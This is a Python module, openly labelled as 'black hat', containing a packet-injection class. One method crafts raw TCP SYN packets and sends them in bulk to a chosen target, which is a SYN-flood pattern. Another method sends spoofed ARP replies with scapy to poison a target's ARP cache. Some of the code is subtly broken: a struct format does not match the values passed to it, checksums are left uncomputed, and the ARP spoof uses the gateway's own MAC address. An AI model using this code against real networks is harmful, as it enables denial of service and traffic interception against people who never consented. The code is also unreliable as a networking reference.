#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Packet Injection Module
Black hat techniques for network manipulation
"""

import socket
import struct
import os
import threading

class PacketInjector:
    """Advanced packet injection with black hat techniques"""
    
    def __init__(self):
        self.socket = None
        
    def create_socket(self):
        """Create raw socket for packet injection"""
        try:
            # Create raw socket (requires admin/root on some systems)
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            return True
        except PermissionError:
            return False
        except Exception as e:
            print(f"Socket creation failed: {e}")
            return False
    
    def craft_syn_packet(self, src_ip, dst_ip, src_port, dst_port):
        """Craft TCP SYN packet"""
        # IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0x00, 0x003c,  # Version, IHL, Total Length
            0x0000, 0x4000,      # Identification, Flags
            0x40, 0x06, 0x0000,  # TTL, Protocol, Checksum (will be calculated)
            socket.inet_aton(src_ip), socket.inet_aton(dst_ip)
        )
        
        # TCP header
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, dst_port,  # Source and destination ports
            0x00000000, 0x00000000,  # Sequence number, ACK
            0x5002, 0x0000, 0x0000  # Data offset, flags (SYN), window
        )
        
        # Calculate TCP checksum
        pseudo_header = struct.pack('!4s4sBBH',
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip),
            0, socket.IPPROTO_TCP, len(tcp_header)
        )
        
        packet = ip_header + tcp_header
        return packet
    
    def inject_packet(self, target_ip, target_port, count=100):
        """Inject SYN packets to target"""
        if not self.create_socket():
            return False
        
        # Get local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        sent = 0
        for i in range(count):
            packet = self.craft_syn_packet(local_ip, target_ip, 54321 + i, target_port)
            try:
                self.socket.sendto(packet, (target_ip, 0))
                sent += 1
            except Exception as e:
                pass
        
        self.socket.close()
        return True
    
    def arp_poison(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """ARP poisoning attack - black hat technique"""
        if not self.create_socket():
            return False
        
        # Craft ARP packet
        try:
            from scapy.all import ARP, send
            arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                            psrc=gateway_ip, hwsrc=gateway_mac)
            
            # Send ARP packet
            send(arp_packet, verbose=False, count=10)
            return True
        except:
            return False

